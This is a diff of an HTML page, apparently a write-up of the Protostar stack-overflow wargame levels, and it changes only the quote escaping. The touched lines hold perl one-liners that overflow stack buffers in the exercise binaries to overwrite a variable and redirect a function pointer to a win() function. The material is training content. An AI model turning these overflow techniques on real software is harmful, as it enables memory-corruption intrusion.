@@ -111,8 +111,8 @@
 <p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack0">full</a>): Overwrite a variable on the stack.</p>
 
 <div>
-  <pre><code class='console'>$ perl -e &quot;print 'a'x65&quot; | ./stack0
-you have changed the 'modified' variable</code></pre>
+  <pre><code class='console'>$ perl -e &quot;print &#39;a&#39;x65&quot; | ./stack0
+you have changed the &#39;modified&#39; variable</code></pre>
 </div>
 
 
@@ -121,7 +121,7 @@ you have changed the 'modified' variable</code></pre>
 <p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack1">full</a>): Overwrite a variable on the stack with a specific series of hex values.</p>
 
 <div>
-  <pre><code class='console'>$ ./stack1 $(perl -e &quot;print 'a'x64 . dcba&quot;)
+  <pre><code class='console'>$ ./stack1 $(perl -e &quot;print &#39;a&#39;x64 . dcba&quot;)
 you have correctly got the variable to the right value</code></pre>
 </div>
 
@@ -149,7 +149,7 @@ you have correctly modified the variable</code></pre>
 <div>
   <pre><code class='console'>$ objdump -d ./stack3 | grep win
 08048424 &lt;win&gt;:
-$ echo -e &quot;$(perl -e &quot;print 'a'x64&quot;)\x24\x84\x04\x08&quot; | ./stack3
+$ echo -e &quot;$(perl -e &quot;print &#39;a&#39;x64&quot;)\x24\x84\x04\x08&quot; | ./stack3
 calling function pointer, jumping to 08048424
 code flow successfully changed</code></pre>
 </div>
